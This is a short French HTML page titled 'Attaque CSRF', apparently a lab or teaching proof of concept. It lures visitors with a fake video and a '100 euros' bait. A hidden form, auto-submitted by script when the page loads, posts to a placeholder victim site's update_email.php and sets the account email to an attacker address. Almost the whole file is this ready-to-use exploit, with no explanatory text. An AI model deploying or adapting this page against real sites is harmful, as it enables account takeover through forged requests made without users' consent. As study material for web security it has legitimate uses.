<!DOCTYPE html>
<html>

<head>
    <title>Attaque CSRF</title>
</head>

<body>
    <h2>Bienvenue !</h2>
    <p>Regarde cette vidéo incroyable !</p>

    <!-- Formulaire caché qui s'envoie automatiquement -->
    <form action="http://victime.test/update_email.php" method="POST">
        <input type="hidden" name="email" value="hacker@example.com">
    </form>
    <span id="btn">Click for 100 euros</span>
    <script>
        //  let btn = document.getElementById('btn');
        document.forms[0].submit(); // Envoie le formulaire dès que la page est chargée
    </script>
</body>

</html>